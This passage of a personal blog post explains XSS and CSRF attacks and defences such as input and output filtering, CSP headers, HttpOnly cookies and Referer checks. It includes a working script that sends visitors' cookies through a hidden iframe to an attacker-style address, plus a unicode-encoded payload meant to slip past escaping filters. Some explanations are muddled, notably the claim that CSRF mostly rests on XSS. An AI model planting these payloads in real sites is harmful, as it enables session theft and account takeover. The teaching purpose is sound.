+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  (function(window, document) &#123;</span><br><span class="line">    // Construct the URL for the leaked information</span><br><span class="line">    var cookies = document.cookie;</span><br><span class="line">    var xssURIBase = &quot;http://192.168.123.123/myxss/&quot;;</span><br><span class="line">    var xssURI = xssURIBase + window.encodeURI(cookies);</span><br><span class="line">    // Create a hidden iframe for communication</span><br><span class="line">    var hideFrame = document.createElement(&quot;iframe&quot;);</span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line">    hideFrame.style.display = &quot;none&quot;;</span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line">    // start</span><br><span class="line">    document.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(window, document);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>This code will pass the cookie of any user who visits the post to a server with the name <code>http://192.168.123.123/myxss/</code>, which can then take this cookie and visit the corresponding website and log into the user’s account, which can then perform other operations.</p>
+<p>Therefore, the above code is XSS.</p>
+<h3 id="CSRF-Cross-Site-Request-Forgery"><a href="#CSRF-Cross-Site-Request-Forgery" class="headerlink" title="CSRF - Cross Site Request Forgery"></a>CSRF - Cross Site Request Forgery</h3><h4 id="Introduction-3"><a href="#Introduction-3" class="headerlink" title="Introduction"></a>Introduction</h4><p>CSRF, known as <strong>Cross-site request forgery</strong>, is a form of cross-site request forgery. It is an attack method that allows a user to perform some unintended actions** (such as name change, post deletion, emailing, etc.) on a currently logged-in web application.</p>
+<h4 id="Attack-Principle"><a href="#Attack-Principle" class="headerlink" title="Attack Principle"></a>Attack Principle</h4><p>Generally speaking, CSRF is implemented by XSS, on top of cross-site scripting, to implement forged requests, causing the victim to perform actions that he or she would not have intended to perform.</p>
+<p>**Note: CSRF can also be implemented without XSS. **</p>
+<h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><p>After the external server has successfully obtained the user’s cookie, it can use the cookie to forge a series of requests to the forum website, such as changing the user’s name, changing the user’s password, etc. At this point, the attack can be called a CSRF.</p>
+<h3 id="Protection-against-XSS-and-CSRF-⭐️"><a href="#Protection-against-XSS-and-CSRF-⭐️" class="headerlink" title="Protection against XSS and CSRF ⭐️"></a>Protection against XSS and CSRF ⭐️</h3><p><em><strong>Core idea: don’t trust any external source data!!!</strong></em></p>
+<p>Generally speaking, most CSRF is based on XSS, so it can be said that by defending against XSS, you are basically defending against CSRF as well.</p>
+<p>For the prevention of XSS, there are two main methods as follows.</p>
+<ol>
+<li><strong>Input filtering: thorough sensitive character filtering of external input</strong> - front end + back end</li>
+<li><strong>Output filtering: when displayed on the page, do some processing so that sensitive code scripts cannot be executed smoothly</strong> - front-end</li>
+</ol>
+<p>Theoretically, wherever there is input data, there is an XSS vulnerability. JavaScript scripts can be injected into the database in various forms (e.g. plaintext, encoded, etc.).</p>
+<p>As mentioned above JS can be injected in a variety of illegal forms, the main illegal forms are of two types.</p>
+<ol>
+<li><p><strong>Plaintext:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js malicious code</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>To handle the filtering of plaintext injections.</p>
+</li>
+<li><p><strong>Coding:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
+<p>The above encoding is unicode, which bypasses the <code>htmlSpecialChars</code> filter and is imported into the library, and then when the message is displayed, the html automatically converts the unicode encoding into plaintext, i.e. a real executable script.</p>
+<p>Since not only unicode can be injected, but other types of encoding as well (for similar reasons), we need to try to set the character encoding of the page to one (e.g. unicode: utf-8) so that we can focus on unicode injection.</p>
+</li>
+</ol>
+<h4 id="Some-other-general-prevention-methods"><a href="#Some-other-general-prevention-methods" class="headerlink" title="Some other general prevention methods"></a>Some other general prevention methods</h4><ol>
+<li><p>add the <code>Http Header</code> of the <code>Content Security Policy</code> to the output html</p>
+<p>What it does: Prevents the page from being embedded in a third-party script file when attacked by XSS</p>
+</li>
+<li><p>add <code>HttpOnly</code> parameter when setting cookies</p>
+<p>Function: To prevent cookie information from being stolen when the page is attacked by XSS</p>
+<p>Disadvantage: the website’s own <code>JavaScript</code> code cannot manipulate cookies</p>
+</li>
+<li><p>check the Referer parameter of the request when developing the API</p>
+<p>Effect: It can prevent CSRF attacks to a certain extent</p>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/en/2022/02/17/DOM%20&%20BOM/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Network"><span class="nav-number">1.</span> <span class="nav-text">Network</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-Protocol"><span class="nav-number">2.</span> <span class="nav-text">HTTP Protocol</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Introduction"><span class="nav-number">2.1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-1-0"><span class="nav-number">2.2.</span> <span class="nav-text">HTTP&#x2F;1.0</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Introduction-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#request-format"><span class="nav-number">2.2.2.</span> <span class="nav-text">request format</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Response-format"><span class="nav-number">2.2.3.</span> <span class="nav-text">Response format</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Content-Type-field"><span class="nav-number">2.2.4.</span> <span class="nav-text">Content-Type field</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Content-Encoding-field"><span class="nav-number">2.2.5.</span> <span class="nav-text">Content-Encoding field</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Disadvantages"><span class="nav-number">2.2.6.</span> <span class="nav-text">Disadvantages</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-1-1"><span class="nav-number">2.3.</span> <span class="nav-text">HTTP&#x2F;1.1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Persistent-connections"><span class="nav-number">2.3.1.</span> <span class="nav-text">Persistent connections</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pipeline-mechanism"><span class="nav-number">2.3.2.</span> <span class="nav-text">Pipeline mechanism</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Content-Length-field"><span class="nav-number">2.3.3.</span> <span class="nav-text">Content-Length field</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chunked-transfer-encoding"><span class="nav-number">2.3.4.</span> <span class="nav-text">chunked-transfer-encoding</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Other-features"><span class="nav-number">2.3.5.</span> <span class="nav-text">Other features</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Disadvantages-1"><span class="nav-number">2.3.6.</span> <span class="nav-text">Disadvantages</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-2"><span class="nav-number">2.4.</span> <span class="nav-text">HTTP&#x2F;2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Binary-protocol"><span class="nav-number">2.4.1.</span> <span class="nav-text">Binary protocol</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Multiplexing"><span class="nav-number">2.4.2.</span> <span class="nav-text">Multiplexing</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data-flow"><span class="nav-number">2.4.3.</span> <span class="nav-text">data flow</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#header-compression"><span class="nav-number">2.4.4.</span> <span class="nav-text">header compression</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Server-Push"><span class="nav-number">2.4.5.</span> <span class="nav-text">Server Push</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTPS-Extra"><span class="nav-number">3.</span> <span class="nav-text">HTTPS - Extra</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Reasons-for-using-HTTPS-amp-what-it-does"><span class="nav-number">3.1.</span> <span class="nav-text">Reasons for using HTTPS &amp; what it does</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-basic-operation-of-the-SSL-TLS-protocol"><span class="nav-number">3.2.</span> <span class="nav-text">The basic operation of the SSL&#x2F;TLS protocol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Handshake-phase"><span class="nav-number">3.3.</span> <span class="nav-text">Handshake phase</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase-1-The-client-sends-a-request"><span class="nav-number">3.3.1.</span> <span class="nav-text">Phase 1: The client sends a request</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase-2-Server-Response"><span class="nav-number">3.3.2.</span> <span class="nav-text">Phase 2: Server Response</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase-3-Client-Response"><span class="nav-number">3.3.3.</span> <span class="nav-text">Phase 3: Client Response</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Phase-4-Final-server-response"><span class="nav-number">3.3.4.</span> <span class="nav-text">Phase 4: Final server response</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Security"><span class="nav-number">4.</span> <span class="nav-text">Web Security</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-Cross-Site-Scripting"><span class="nav-number">4.1.</span> <span class="nav-text">XSS - Cross Site Scripting</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Introduction-2"><span class="nav-number">4.1.1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Example"><span class="nav-number">4.1.2.</span> <span class="nav-text">Example</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF-Cross-Site-Request-Forgery"><span class="nav-number">4.2.</span> <span class="nav-text">CSRF - Cross Site Request Forgery</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Introduction-3"><span class="nav-number">4.2.1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-Principle"><span class="nav-number">4.2.2.</span> <span class="nav-text">Attack Principle</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Example-1"><span class="nav-number">4.2.3.</span> <span class="nav-text">Example</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Protection-against-XSS-and-CSRF-%E2%AD%90%EF%B8%8F"><span class="nav-number">4.3.</span> <span class="nav-text">Protection against XSS and CSRF ⭐️</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Some-other-general-prevention-methods"><span class="nav-number">4.3.1.</span> <span class="nav-text">Some other general prevention methods</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Will"
+      src="/en/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Will</p>
+  <div class="site-description" itemprop="description">This is a story about Binary Vagabondage...</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/en/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Will</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">73k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">1:06</span>
+</div>
+
+<!--
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/en/lib/anime.min.js"></script>
+  <script src="/en/lib/velocity/velocity.min.js"></script>
+  <script src="/en/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/en/js/utils.js"></script>
+
+<script src="/en/js/motion.js"></script>
+
+
+<script src="/en/js/schemes/pisces.js"></script>
+
+
+<script src="/en/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/en/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
